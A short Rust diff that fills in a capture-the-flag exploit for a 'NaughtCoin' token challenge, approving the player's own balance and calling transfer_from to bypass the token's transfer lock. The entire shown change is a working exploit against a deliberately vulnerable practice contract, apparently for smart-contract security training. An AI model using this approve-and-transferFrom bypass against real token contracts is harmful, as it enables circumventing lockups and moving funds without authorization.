@@ -30,6 +30,17 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let coin = NaughtCoin::new(target.address, offender.to_owned());
+
+        let balance = coin.balance_of(offender.address()).await?;
+
+        coin.approve(offender.address(), balance).send().await?.await?;
+
+        coin.transfer_from(offender.address(), coin.address(), balance)
+            .send()
+            .await?
+            .await?;
+
         Ok(())
     }
 }
